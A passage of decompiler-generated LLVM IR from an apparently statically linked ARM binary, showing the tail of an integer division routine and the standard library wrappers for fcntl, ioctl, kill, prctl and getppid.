  br i1 %v6_12c5c, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_12c60 = urem i32 %v1_12c88, 2
  %v4_12c60 = icmp eq i32 %v3_12c60, 0
  %v6_12c60 = sub i32 %v1_12c60, %v4_12c5c
  br i1 %v4_12c60, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_12c64 = udiv i32 %v1_12c84, 2
  %v6_12c64 = or i32 %v1_12c64, %v5_12c64
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_12c6c = phi i32 [ %v6_12c60, %bb93 ], [ %v1_12c60, %.thread8 ], [ %v6_12c60, %bb94 ]
  %v1_12c70 = phi i32 [ %v1_12c64, %bb93 ], [ %v1_12c64, %.thread8 ], [ %v6_12c64, %bb94 ]
  %v4_12c68 = udiv i32 %v1_12c88, 4
  %v6_12c68 = icmp ult i32 %v1_12c6c, %v4_12c68
  br i1 %v6_12c68, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_12c6c = and i32 %v1_12c88, 2
  %v4_12c6c = icmp eq i32 %v3_12c6c, 0
  %v6_12c6c = sub i32 %v1_12c6c, %v4_12c68
  br i1 %v4_12c6c, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_12c70 = udiv i32 %v1_12c84, 4
  %v6_12c70 = or i32 %v1_12c70, %v5_12c70
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_12c78 = phi i32 [ %v6_12c6c, %bb95 ], [ %v1_12c6c, %.thread9 ], [ %v6_12c6c, %bb96 ]
  %v1_12c7c = phi i32 [ %v1_12c70, %bb95 ], [ %v1_12c70, %.thread9 ], [ %v6_12c70, %bb96 ]
  %v4_12c74 = udiv i32 %v1_12c88, 8
  %v6_12c74 = icmp ult i32 %v1_12c78, %v4_12c74
  br i1 %v6_12c74, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_12c78 = and i32 %v1_12c88, 4
  %v4_12c78 = icmp eq i32 %v3_12c78, 0
  %v6_12c78 = sub i32 %v1_12c78, %v4_12c74
  br i1 %v4_12c78, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_12c7c = udiv i32 %v1_12c84, 8
  %v6_12c7c = or i32 %v1_12c7c, %v5_12c7c
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_12c94 = phi i32 [ %v1_12c7c, %bb97 ], [ %v1_12c7c, %.thread10 ], [ %v6_12c7c, %bb98 ]
  %v0_12c80 = phi i32 [ %v6_12c78, %bb97 ], [ %v1_12c78, %.thread10 ], [ %v6_12c78, %bb98 ]
  %v2_12c80 = icmp eq i32 %v0_12c80, 0
  br i1 %v2_12c80, label %dec_label_pc_12c90, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_12c84, 16
  br i1 %tmp, label %dec_label_pc_12c90, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_12c84 = udiv i32 %v1_12c84, 16
  %v4_12c88 = udiv i32 %v1_12c88, 16
  br label %dec_label_pc_12c50

dec_label_pc_12c90:                               ; preds = %thread-pre-split12, %bb99
  %v1_12c90 = icmp slt i32 %v2_12be8, 0
  br i1 %v1_12c90, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_12c90
  %v2_12c94 = sub i32 0, %v1_12c94
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_12c9c, %dec_label_pc_12c90, %bb100
  %v1_12c98 = phi i32 [ %v1_12c94, %dec_label_pc_12c90 ], [ %v2_12c94, %bb100 ], [ %arg1, %dec_label_pc_12c9c ], [ %v2_12ca0, %bb101 ], [ %v1_12cb480, %bb103 ], [ %v2_12cb0, %bb104 ]
  ret i32 %v1_12c98

dec_label_pc_12c9c:                               ; preds = %thread-pre-split
  br i1 %v1_12be4, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_12c9c
  %v2_12ca0 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_12ca8:                               ; preds = %bb86
  br i1 %v3_12c04, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_12ca8
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_12ca8, %bb102
  %v1_12cb480 = phi i32 [ %arg1, %dec_label_pc_12ca8 ], [ 0, %bb102 ]
  br i1 %v9_12c04, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_12cac = ashr i32 %v2_12be8, 31
  %v2_12cb0 = or i32 %v4_12cac, 1
  br label %.thread16

dec_label_pc_12cb8:                               ; preds = %dec_label_pc_12c0c
  %v2_12cb8 = icmp ugt i32 %v1_12cbc, 65535
  br i1 %v2_12cb8, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_12cb8
  %v2_12cbc = and i32 %v1_12cbc, 32768
  %v3_12cbc = icmp eq i32 %v2_12cbc, 0
  %v4_12cbc = udiv i32 %v1_12cbc, 65536
  br i1 %v3_12cbc, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_12cb8
  %v0_12cc870 = phi i32 [ %v1_12cbc, %dec_label_pc_12cb8 ], [ %v4_12cbc, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_12ccc = phi i32 [ %v0_12cc870, %.thread19 ], [ %v4_12cbc, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_12cc8 = icmp ugt i32 %v1_12ccc, 255
  br i1 %v2_12cc8, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_12ccc = and i32 %v1_12ccc, 128
  %v3_12ccc = icmp eq i32 %v2_12ccc, 0
  %v4_12ccc = udiv i32 %v1_12ccc, 256
  br i1 %v3_12ccc, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_12cd0 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_12cdc = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_12cd0, %bb108 ]
  %v1_12cd8 = phi i32 [ %v1_12ccc, %bb106 ], [ %v4_12ccc, %bb107 ], [ %v4_12ccc, %bb108 ]
  %v2_12cd4 = icmp ugt i32 %v1_12cd8, 15
  br i1 %v2_12cd4, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_12cd8 = and i32 %v1_12cd8, 8
  %v3_12cd8 = icmp eq i32 %v2_12cd8, 0
  %v4_12cd8 = udiv i32 %v1_12cd8, 16
  br i1 %v3_12cd8, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_12cdc = add nsw i32 %v1_12cdc, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_12ce4 = phi i32 [ %v1_12cdc, %.thread20 ], [ %v1_12cdc, %bb109 ], [ %v2_12cdc, %bb110 ]
  %v5_12ce8 = phi i32 [ %v1_12cd8, %.thread20 ], [ %v4_12cd8, %bb109 ], [ %v4_12cd8, %bb110 ]
  %v2_12ce0 = icmp ugt i32 %v5_12ce8, 3
  %v7_12ce0 = icmp eq i32 %v5_12ce8, 4
  %v2_12ce4 = xor i1 %v7_12ce0, true
  %v3_12ce4 = and i1 %v2_12ce0, %v2_12ce4
  br i1 %v3_12ce4, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_12ce4 = add nsw i32 %v4_12ce4, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_12ce8 = phi i32 [ %v4_12ce4, %.thread21 ], [ %v5_12ce4, %bb111 ]
  %v2_12ce8 = xor i1 %v2_12ce0, true
  %v3_12ce8 = or i1 %v7_12ce0, %v2_12ce8
  br i1 %v3_12ce8, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_12ce8 = udiv i32 %v5_12ce8, 2
  %v9_12ce8 = add i32 %v4_12ce8, %v8_12ce8
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_12cf0 = phi i32 [ %v4_12ce8, %bb112 ], [ %v9_12ce8, %bb113 ]
  %v1_12cec = icmp slt i32 %v2_12be8, 0
  %v6_12cf0 = lshr i32 %v0_12cf0, %v1_12cf0
  %v2_12cf4 = sub i32 0, %v6_12cf0
  %v2_12cf4.v6_12cf0 = select i1 %v1_12cec, i32 %v2_12cf4, i32 %v6_12cf0
  ret i32 %v2_12cf4.v6_12cf0

dec_label_pc_12cfc:                               ; preds = %entry
  %v0_12d00 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_12ce8, { 1, 0 }
  uselistorder i1 %v7_12ce0, { 1, 0 }
  uselistorder i32 %v4_12cd8, { 1, 0 }
  uselistorder i32 %v1_12cd8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12ccc, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_12ccc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12cbc, { 1, 0 }
  uselistorder i32 %v0_12c80, { 1, 0 }
  uselistorder i32 %v4_12c74, { 1, 0 }
  uselistorder i32 %v1_12c7c, { 1, 2, 0 }
  uselistorder i32 %v4_12c68, { 1, 0 }
  uselistorder i32 %v1_12c70, { 1, 2, 0 }
  uselistorder i32 %v4_12c5c, { 1, 0 }
  uselistorder i32 %v1_12c64, { 1, 2, 0 }
  uselistorder i32 %v1_12c88, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_12c58, { 1, 0 }
  uselistorder i32 %v1_12c84, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_12c44, { 1, 0 }
  uselistorder i32 %v3_12c40, { 1, 0 }
  uselistorder i32 %v1_12c40, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_12c3c, { 1, 0 }
  uselistorder i32 %v1_12c44, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12c30, { 1, 0 }
  uselistorder i32 %v4_12c2c, { 2, 1, 0 }
  uselistorder i32 %v1_12c30, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_12c38.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_12c04, { 1, 0 }
  uselistorder i32 %v1_12cbc, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_12be8, { 1, 0, 2 }
  uselistorder i32 %v0_12be4, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 65535, { 92, 93, 0, 1, 12, 11, 2, 3, 43, 44, 23, 45, 22, 46, 14, 13, 4, 25, 47, 24, 48, 50, 15, 49, 5, 51, 52, 27, 53, 26, 54, 55, 56, 57, 28, 58, 59, 16, 60, 6, 31, 61, 62, 63, 30, 64, 29, 65, 67, 17, 66, 7, 68, 69, 35, 70, 32, 71, 33, 72, 34, 73, 18, 74, 75, 36, 76, 37, 77, 80, 81, 19, 78, 79, 8, 40, 82, 38, 83, 39, 84, 86, 20, 85, 9, 10, 87, 88, 42, 89, 41, 90, 21, 91 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_12c90, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_12c4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12c38thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_12d14 = sdiv i32 %arg1, %arg2
  ret i32 %v2_12d14
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_12d30 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_12d30
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_12d4c = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_12d4c, 2
  br i1 %tmp, label %dec_label_pc_12d88, label %dec_label_pc_12d64

dec_label_pc_12d64:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_12dbc, label %dec_label_pc_12d78

dec_label_pc_12d78:                               ; preds = %dec_label_pc_12d64
  %v0_12d7c = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_12db0

dec_label_pc_12d88:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_12da4, label %dec_label_pc_12dbc

dec_label_pc_12da4:                               ; preds = %dec_label_pc_12d88
  %v0_12da8 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_12db0

dec_label_pc_12db0:                               ; preds = %dec_label_pc_12d78, %dec_label_pc_12da4
  %storemerge2 = phi i32 [ %v0_12d7c, %dec_label_pc_12d78 ], [ %v0_12da8, %dec_label_pc_12da4 ]
  %storemerge.in = load i16, i16* @global_var_244d0.762, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_12db0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12db0 = sub i32 0, %v0_12db0
  store i32 %v1_12db0, i32* %r2.global-to-local, align 4
  %v3_12db4 = add i32 %storemerge, %storemerge2
  %v4_12db4 = inttoptr i32 %v3_12db4 to i32*
  store i32 %v1_12db0, i32* %v4_12db4, align 4
  br label %dec_label_pc_12dbc

dec_label_pc_12dbc:                               ; preds = %dec_label_pc_12d64, %dec_label_pc_12d88, %dec_label_pc_12db0
  %storemerge1 = phi i32 [ -1, %dec_label_pc_12db0 ], [ %arg1, %dec_label_pc_12d88 ], [ %arg1, %dec_label_pc_12d64 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_12dbc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12db0, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_12dd4 = load i32, i32* @r2, align 4
  %v9_12dd4 = load i32, i32* @r3, align 4
  store i32 %v9_12dd4, i32* %stack_var_-4, align 4
  %v3_12dd8 = load i32, i32* @r4, align 4
  store i32 %v3_12dd8, i32* %stack_var_-32, align 4
  %v6_12dd8 = load i32, i32* @r5, align 4
  %v12_12dd8 = load i32, i32* @r7, align 4
  %v4_12de8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 13032) to i32*), align 4
  %v2_12df0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12df0, i32* @r3, align 4
  %v2_12df4 = icmp eq i32 %v4_12de8, 0
  %v0_12dfc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12dfc, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_12dd4, i32* @r4, align 4
  br i1 %v2_12df4, label %dec_label_pc_12e18, label %dec_label_pc_12e0c

dec_label_pc_12e0c:                               ; preds = %entry
  %v7_12e0c = icmp eq i32 %arg2, 7
  br i1 %v7_12e0c, label %dec_label_pc_12e58, label %bb

bb:                                               ; preds = %dec_label_pc_12e0c
  %v8_12e10 = icmp eq i32 %arg2, 14
  br i1 %v8_12e10, label %dec_label_pc_12e58, label %dec_label_pc_12e18

dec_label_pc_12e18:                               ; preds = %bb, %entry
  store i32 %arg2, i32* @r1, align 4
  store i32 %v0_12dfc, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_12dfc, -4095
  br i1 %tmp, label %dec_label_pc_12e50, label %dec_label_pc_12e38

dec_label_pc_12e38:                               ; preds = %dec_label_pc_12e18
  %v0_12e3c = call i32 @__aeabi_read_tp()
  %v3_12e40 = load i16, i16* @global_var_244d0.762, align 2
  %v4_12e40 = sext i16 %v3_12e40 to i32
  store i32 %v4_12e40, i32* @r3, align 4
  %v0_12e44 = load i32, i32* @r2, align 4
  %v1_12e44 = sub i32 0, %v0_12e44
  store i32 %v1_12e44, i32* @r2, align 4
  %v3_12e48 = add i32 %v4_12e40, %v0_12e3c
  %v4_12e48 = inttoptr i32 %v3_12e48 to i32*
  store i32 %v1_12e44, i32* %v4_12e48, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12e50

dec_label_pc_12e50:                               ; preds = %dec_label_pc_12e18, %dec_label_pc_12e38
  %v0_12e50 = phi i32 [ %v0_12dfc, %dec_label_pc_12e18 ], [ -1, %dec_label_pc_12e38 ]
  br label %dec_label_pc_12ea4

dec_label_pc_12e58:                               ; preds = %dec_label_pc_12e0c, %bb
  %v0_12e58 = call i32 @__libc_enable_asynccancel()
  %v0_12e5c = load i32, i32* @r7, align 4
  store i32 %v0_12e5c, i32* @r1, align 4
  store i32 %v0_12e58, i32* %r6.global-to-local, align 4
  %v0_12e68 = load i32, i32* @r5, align 4
  store i32 %v0_12e68, i32* %r0.global-to-local, align 4
  store i32 %v0_12e68, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_12e68, -4095
  br i1 %tmp15, label %dec_label_pc_12e98, label %dec_label_pc_12e80

dec_label_pc_12e80:                               ; preds = %dec_label_pc_12e58
  %v1_12e84 = sub i32 0, %v0_12e68
  %v0_12e88 = call i32 @__aeabi_read_tp()
  store i32 %v0_12e88, i32* %r0.global-to-local, align 4
  %v3_12e8c = load i16, i16* @global_var_244d0.762, align 2
  %v4_12e8c = sext i16 %v3_12e8c to i32
  store i32 %v4_12e8c, i32* @r3, align 4
  %v3_12e90 = add i32 %v4_12e8c, %v0_12e88
  %v4_12e90 = inttoptr i32 %v3_12e90 to i32*
  store i32 %v1_12e84, i32* %v4_12e90, align 4
  store i32 -1, i32* @r2, align 4
  %v0_12e98.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12e98

dec_label_pc_12e98:                               ; preds = %dec_label_pc_12e58, %dec_label_pc_12e80
  %v0_12e9c = phi i32 [ %v0_12e68, %dec_label_pc_12e58 ], [ -1, %dec_label_pc_12e80 ]
  %v0_12e98 = phi i32 [ %v0_12e58, %dec_label_pc_12e58 ], [ %v0_12e98.pre, %dec_label_pc_12e80 ]
  store i32 %v0_12e98, i32* %r0.global-to-local, align 4
  store i32 %v0_12e9c, i32* @r7, align 4
  %v1_12ea0 = call i32 @__libc_disable_asynccancel(i32 %v0_12e98)
  store i32 %v1_12ea0, i32* %r0.global-to-local, align 4
  %v0_12ea4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12ea4

dec_label_pc_12ea4:                               ; preds = %dec_label_pc_12e50, %dec_label_pc_12e98
  %v0_12ea4 = phi i32 [ %v0_12e50, %dec_label_pc_12e50 ], [ %v0_12ea4.pre, %dec_label_pc_12e98 ]
  store i32 %v0_12ea4, i32* %r0.global-to-local, align 4
  %v2_12eac = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12eac, i32* @r4, align 4
  store i32 %v6_12dd8, i32* @r5, align 4
  store i32 %v12_12dd8, i32* @r7, align 4
  ret i32 %v0_12ea4

; uselistorder directives
  uselistorder i32 %v0_12ea4, { 1, 0 }
  uselistorder i32 %v0_12e98, { 1, 0 }
  uselistorder i32 %v0_12e68, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12dfc, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 2, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_12ea4, { 1, 0 }
  uselistorder label %dec_label_pc_12e98, { 1, 0 }
  uselistorder label %dec_label_pc_12e58, { 1, 0 }
  uselistorder label %dec_label_pc_12e50, { 1, 0 }
}

define i32 @getppid() local_unnamed_addr {
entry:
  %v1_12ed8 = load i32, i32* @r0, align 4
  ret i32 %v1_12ed8
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_12edc = load i32, i32* @r3, align 4
  store i32 %v9_12edc, i32* %stack_var_-4, align 4
  %v3_12ee0 = load i32, i32* @r4, align 4
  store i32 %v3_12ee0, i32* %stack_var_-32, align 4
  %v6_12ee0 = load i32, i32* @r5, align 4
  %v12_12ee0 = load i32, i32* @r7, align 4
  %v4_12ef0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 13032) to i32*), align 4
  %v2_12ef8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_12ef8, i32* @r3, align 4
  %v2_12efc = icmp eq i32 %v4_12ef0, 0
  %v0_12f04 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12f04, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_12efc, label %dec_label_pc_12f14, label %dec_label_pc_12f4c

dec_label_pc_12f14:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_12f04, -4095
  br i1 %tmp, label %dec_label_pc_12f44, label %dec_label_pc_12f2c

dec_label_pc_12f2c:                               ; preds = %dec_label_pc_12f14
  %v1_12f30 = sub i32 0, %v0_12f04
  %v3_12f34 = load i16, i16* @global_var_244d0.762, align 2
  %v4_12f34 = sext i16 %v3_12f34 to i32
  store i32 %v4_12f34, i32* @r3, align 4
  %v0_12f38 = call i32 @__aeabi_read_tp()
  %v2_12f3c = load i32, i32* @r3, align 4
  %v3_12f3c = add i32 %v2_12f3c, %v0_12f38
  %v4_12f3c = inttoptr i32 %v3_12f3c to i32*
  store i32 %v1_12f30, i32* %v4_12f3c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f44

dec_label_pc_12f44:                               ; preds = %dec_label_pc_12f14, %dec_label_pc_12f2c
  %v0_12f44 = phi i32 [ %v0_12f04, %dec_label_pc_12f14 ], [ -1, %dec_label_pc_12f2c ]
  br label %dec_label_pc_12f98

dec_label_pc_12f4c:                               ; preds = %entry
  %v0_12f4c = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12f4c, i32* %r6.global-to-local, align 4
  %v0_12f5c = load i32, i32* @r4, align 4
  store i32 %v0_12f5c, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_12f5c, -4095
  br i1 %tmp15, label %dec_label_pc_12f8c, label %dec_label_pc_12f74

dec_label_pc_12f74:                               ; preds = %dec_label_pc_12f4c
  %v1_12f78 = sub i32 0, %v0_12f5c
  %v3_12f7c = load i16, i16* @global_var_244d0.762, align 2
  %v4_12f7c = sext i16 %v3_12f7c to i32
  store i32 %v4_12f7c, i32* @r3, align 4
  %v0_12f80 = call i32 @__aeabi_read_tp()
  store i32 %v0_12f80, i32* %r0.global-to-local, align 4
  %v2_12f84 = load i32, i32* @r3, align 4
  %v3_12f84 = add i32 %v2_12f84, %v0_12f80
  %v4_12f84 = inttoptr i32 %v3_12f84 to i32*
  store i32 %v1_12f78, i32* %v4_12f84, align 4
  %v0_12f8c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12f8c

dec_label_pc_12f8c:                               ; preds = %dec_label_pc_12f4c, %dec_label_pc_12f74
  %v0_12f90 = phi i32 [ %v0_12f5c, %dec_label_pc_12f4c ], [ -1, %dec_label_pc_12f74 ]
  %v0_12f8c = phi i32 [ %v0_12f4c, %dec_label_pc_12f4c ], [ %v0_12f8c.pre, %dec_label_pc_12f74 ]
  store i32 %v0_12f8c, i32* %r0.global-to-local, align 4
  store i32 %v0_12f90, i32* @r7, align 4
  %v1_12f94 = call i32 @__libc_disable_asynccancel(i32 %v0_12f8c)
  store i32 %v1_12f94, i32* %r0.global-to-local, align 4
  %v0_12f98.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12f98

dec_label_pc_12f98:                               ; preds = %dec_label_pc_12f44, %dec_label_pc_12f8c
  %v0_12f98 = phi i32 [ %v0_12f44, %dec_label_pc_12f44 ], [ %v0_12f98.pre, %dec_label_pc_12f8c ]
  store i32 %v0_12f98, i32* %r0.global-to-local, align 4
  %v2_12fa0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_12fa0, i32* @r4, align 4
  store i32 %v6_12ee0, i32* @r5, align 4
  store i32 %v12_12ee0, i32* @r7, align 4
  ret i32 %v0_12f98

; uselistorder directives
  uselistorder i32 %v0_12f98, { 1, 0 }
  uselistorder i32 %v0_12f8c, { 1, 0 }
  uselistorder i32 %v0_12f5c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_12f04, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 7, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_12f98, { 1, 0 }
  uselistorder label %dec_label_pc_12f8c, { 1, 0 }
  uselistorder label %dec_label_pc_12f44, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12fbc = load i32, i32* @r7, align 4
  store i32 %v3_12fbc, i32* %stack_var_-8, align 4
  %v0_12fc8 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12fc8, -4095
  br i1 %tmp, label %dec_label_pc_12fe8, label %dec_label_pc_12fd0

dec_label_pc_12fd0:                               ; preds = %entry
  %v1_12fd4 = sub i32 0, %v0_12fc8
  %v3_12fd8 = load i16, i16* @global_var_244d0.762, align 2
  %v4_12fd8 = sext i16 %v3_12fd8 to i32
  %v0_12fdc = call i32 @__aeabi_read_tp()
  %v3_12fe0 = add i32 %v4_12fd8, %v0_12fdc
  %v4_12fe0 = inttoptr i32 %v3_12fe0 to i32*
  store i32 %v1_12fd4, i32* %v4_12fe0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12fe8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12fe8

dec_label_pc_12fe8:                               ; preds = %entry, %dec_label_pc_12fd0
  %v1_12fec = phi i32 [ %v0_12fc8, %entry ], [ -1, %dec_label_pc_12fd0 ]
  %v2_12fe8 = phi i32 [ %v3_12fbc, %entry ], [ %v2_12fe8.pre, %dec_label_pc_12fd0 ]
  store i32 %v2_12fe8, i32* @r7, align 4
  ret i32 %v1_12fec

; uselistorder directives
  uselistorder i32 %v0_12fc8, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12fe8, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_12ff4 = load i32, i32* @r4, align 4
  store i32 %v3_12ff4, i32* %stack_var_-12, align 4
  %v0_13004 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13004, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13004, -4095
  br i1 %tmp, label %dec_label_pc_1302c, label %dec_label_pc_13014

dec_label_pc_13014:                               ; preds = %entry
  %v0_13018 = call i32 @__aeabi_read_tp()
  %v3_1301c = load i16, i16* @global_var_244d0.762, align 2
  %v4_1301c = sext i16 %v3_1301c to i32
  %v0_13020 = load i32, i32* %r2.global-to-local, align 4
  %v1_13020 = sub i32 0, %v0_13020
  store i32 %v1_13020, i32* %r2.global-to-local, align 4
  %v3_13024 = add i32 %v4_1301c, %v0_13018
  %v4_13024 = inttoptr i32 %v3_13024 to i32*
  store i32 %v1_13020, i32* %v4_13024, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1302c.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1302c

dec_label_pc_1302c:                               ; preds = %entry, %dec_label_pc_13014
  %v1_13030 = phi i32 [ %v0_13004, %entry ], [ -1, %dec_label_pc_13014 ]
  %v2_1302c = phi i32 [ %v3_12ff4, %entry ], [ %v2_1302c.pre, %dec_label_pc_13014 ]
  store i32 %v2_1302c, i32* @r4, align 4
  ret i32 %v1_13030

; uselistorder directives
  uselistorder i32 %v0_13004, { 1, 0, 2 }
